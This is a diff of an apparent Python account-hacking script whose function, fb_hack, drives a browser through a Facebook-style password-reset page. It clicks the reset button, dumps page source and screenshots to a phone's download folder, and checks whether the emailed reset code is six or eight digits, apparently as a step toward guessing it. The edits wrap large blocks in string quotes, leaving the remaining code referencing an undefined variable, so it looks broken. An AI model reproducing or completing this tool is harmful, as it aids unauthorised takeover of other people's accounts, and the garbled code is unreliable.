@@ -55,7 +55,7 @@ def fb_hack(email, codex, respect):
   search_button = driver.find_element(by = By.NAME, value = "reset_action")
   search_button.click()
   sleep(2)
-  html = driver.page_source
+  """html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
   with open("output1.txt", "w") as file:
     file.write(str(soup))
@@ -68,17 +68,8 @@ def fb_hack(email, codex, respect):
   source_file = "output1.html" 
   destination_folder = "/sdcard/download/output1.html" 
   shutil.move(source_file, destination_folder)
-  driver.save_screenshot("/sdcard/download/tester.png")
-  """"make respect properly"
+  driver.save_screenshot("/sdcard/download/tester.png")"""
   counter = 0
-  html = driver.page_source
-  soup = BeautifulSoup(html, 'html.parser')
-  with open("output1.txt", "w") as file:
-    file.write(str(soup))
-  #source_file = "output1.txt" 
-  #destination_folder = "/sdcard/download/screenshot.png" 
-  
-  #shutil.move(source_file, destination_folder)
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
@@ -119,7 +110,7 @@ def fb_hack(email, codex, respect):
         respect = 0
         break
       sleepy(30)
-  past = int(respect)"""
+  past = int(respect)
   return past
 
 os.system('clear')
